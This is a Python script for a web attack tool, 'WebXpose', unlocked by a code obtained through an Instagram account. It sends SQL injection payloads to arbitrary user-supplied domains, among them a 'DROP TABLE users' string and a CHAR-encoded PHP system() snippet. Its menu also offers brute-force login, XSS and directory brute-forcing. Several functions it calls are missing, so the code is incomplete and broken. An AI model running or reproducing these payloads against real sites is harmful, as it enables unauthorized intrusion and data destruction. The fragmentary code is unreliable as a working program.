import socket
import whois
import requests
import dns.resolver
import subprocess
import ssl
from colorama import Fore, Back, Style, init
import pyfiglet
import time
from passlib.context import CryptContext
import shodan
import re
from urllib.parse import urlparse, urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for colorful console output
init(autoreset=True)

# Function to generate the WebXpose logo
def generate_logo():
    return pyfiglet.figlet_format("WebXpose", font="slant")

# Function for typewriter effect
def type_writer_effect(message, speed=0.05, color=Fore.WHITE):
    for char in message:
        print(color + char, end="", flush=True)
        time.sleep(speed)
    print()

# Lock and unlock mechanism
UNLOCK_CODE = "hatelove"
is_locked = True

def check_unlock():
    global is_locked
    try:
        type_writer_effect("\nEnter the unlock code to proceed: ", speed=0.02, color=Fore.YELLOW)
        code = input(Fore.YELLOW + ">>> ")
        if code == UNLOCK_CODE:
            is_locked = False
            type_writer_effect("Tool unlocked. Welcome!", speed=0.02, color=Fore.GREEN)
        else:
            type_writer_effect("Incorrect unlock code. Tool remains locked.", speed=0.02, color=Fore.RED)
            type_writer_effect("Exiting...", speed=0.02, color=Fore.RED)
            exit()
    except Exception as e:
        print(Fore.RED + f"An error occurred while checking the unlock code: {e}")
        exit()

# Main functions with error handling (enhanced for visual appeal)

def advanced_sql_injection_scan(domain):
    type_writer_effect(f"\nPerforming Advanced SQL Injection Scan on {domain}", speed=0.02, color=Fore.CYAN)
    base_url = f"http://{domain}"
    try:
        test_urls = input(Fore.YELLOW + "Enter test URLs separated by commas (e.g., /login,/search): ").split(',')
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "UNION SELECT 1,2,3,4,5-- -",
            "') OR ('1'='1-- -",
            "' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(60,63,112,104,112,62,115,121,115,116,101,109,40,39,101,99,104,111,32,39,43,40,83,69,76,65,67,84,32,40,67,85,82,82,69,78,84,95,85,83,69,82,41,41,43,39,59,63,62,60,47,112,104,112,62),NULL,NULL-- -",
        ]
        
        for url in test_urls:
            full_url = urljoin(base_url, url)
            for payload in payloads:
                try:
                    response = requests.get(full_url, params={'id': payload}, verify=False)
                    if "error in your SQL syntax" in response.text.lower() or "SQL syntax;" in response.text:
                        print(Fore.GREEN + f"Potential SQL Injection detected at {full_url} with payload: {payload}")
                    elif "union" in payload.lower() and "union" in response.text.lower():
                        print(Fore.GREEN + f"Possible UNION-based SQL Injection at {full_url}")
                    elif payload in response.text:
                        print(Fore.YELLOW + f"Payload reflection detected at {full_url} with payload: {payload}")
                    elif blind_sqli_check(full_url, payload):
                        print(Fore.YELLOW + f"Possible Blind SQL Injection at {full_url} with payload: {payload}")
                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"Error during SQL Injection test on {full_url}: {e}")
    except Exception as e:
        print(Fore.RED + f"An error occurred during the SQL Injection Scan: {e}")

# ... (Other functions like `blind_sqli_check`, `time_based_blind_sqli`, `detect_waf`, `crawl_for_forms` would remain unchanged)

def menu(use_api=False):
    try:
        if use_api:
            vt_api_key = input(Fore.YELLOW + "Enter your VirusTotal API key: ").strip()
            shodan_api_key = input(Fore.YELLOW + "Enter your Shodan API key: ").strip()
        else:
            vt_api_key = shodan_api_key = None
        
        while True:
            print(Fore.CYAN + Back.BLACK + "="*50)
            print(generate_logo())
            print(Fore.CYAN + Back.BLACK + "="*50)
            type_writer_effect("\nMENU OPTIONS:", speed=0.02, color=Fore.MAGENTA)
            print(Fore.GREEN + '''
 [0]  Basic Recon (Site Title, IP Address, CMS, Cloudflare Detection, Robots.txt Scanner)
 [1]  Whois Lookup
 [2]  Geo-IP Lookup
 [3]  Grab Banners
 [4]  DNS Lookup
 [5]  NMAP Port Scan
 [6]  Subdomain Scanner
 [7]  SSL Certificate Info
 [8]  Reputation Check (VirusTotal)''' + ('' if use_api else ' (Requires API)')
            + '''
 [9]  Brute Force Login Attempt
 [10] Basic SQL Injection Scan
 [11] XSS Vulnerability Scan
 [12] Directory Brute Force
 [13] Shodan Search''' + ('' if use_api else ' (Requires API)')
            + '''
 [14] Advanced SQL Injection Scan
 [15] WAF Detection
 [16] Time-Based Blind SQL Injection
 [17] Crawl for Forms and Parameters
 [Q]  Quit!  
            ''')
            print(Fore.CYAN + Back.BLACK + "="*50)

            choice = input(Fore.YELLOW + "Enter your choice: ").upper()

            if choice == 'Q':
                type_writer_effect("Exiting tool...", speed=0.02, color=Fore.RED)
                break

            # ... (previous cases with error handling and enhanced visuals)
            elif choice == '8':
                if use_api:
                    domain = input(Fore.YELLOW + "Enter the domain (e.g., example.com): ")
                    check_reputation(domain, vt_api_key)
                else:
                    type_writer_effect("API access required for this feature. Skipping.", speed=0.02, color=Fore.YELLOW)
            elif choice == '13':
                if use_api:
                    ip = input(Fore.YELLOW + "Enter the IP address: ")
                    shodan_search(ip, shodan_api_key)
                else:
                    type_writer_effect("API access required for this feature. Skipping.", speed=0.02, color=Fore.YELLOW)
            elif choice == '14':
                domain = input(Fore.YELLOW + "Enter the domain (e.g., example.com): ")
                advanced_sql_injection_scan(domain)
            elif choice == '15':
                domain = input(Fore.YELLOW + "Enter the domain (e.g., example.com): ")
                detect_waf(domain)
            elif choice == '16':
                domain = input(Fore.YELLOW + "Enter the domain (e.g., example.com): ")
                time_based_blind_sqli(domain)
            elif choice == '17':
                domain = input(Fore.YELLOW + "Enter the domain (e.g., example.com): ")
                crawl_for_forms(domain)
            else:
                type_writer_effect("Invalid choice. Please try again.", speed=0.02, color=Fore.RED)
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred in the menu: {e}")

# Header
print(Fore.CYAN + Back.BLACK + " "*20 + "WebXpose" + " "*20)
print(Fore.CYAN + Back.BLACK + "="*50)
print(generate_logo())
print(Fore.CYAN + Back.BLACK + "="*50)

print("Created by Maria")
type_writer_effect("1. Go to Insta and message", speed=0.02, color=Fore.YELLOW)
type_writer_effect("2. Insta ID: cyberphantomsyndicate", speed=0.02, color=Fore.YELLOW)
type_writer_effect("3. Send message for code", speed=0.02, color=Fore.YELLOW)
type_writer_effect("4. Next time come with code and use this tool", speed=0.02, color=Fore.YELLOW)
type_writer_effect("5. Bye", speed=0.02, color=Fore.YELLOW)

check_unlock()  # Check if the tool should be unlocked

# Ask if user wants to use API
use_api = input(Fore.YELLOW + "Do you want to use APIs? (y/n): ").lower() == 'y'

if not is_locked:
    menu(use_api)  # Run the menu, optionally with API support
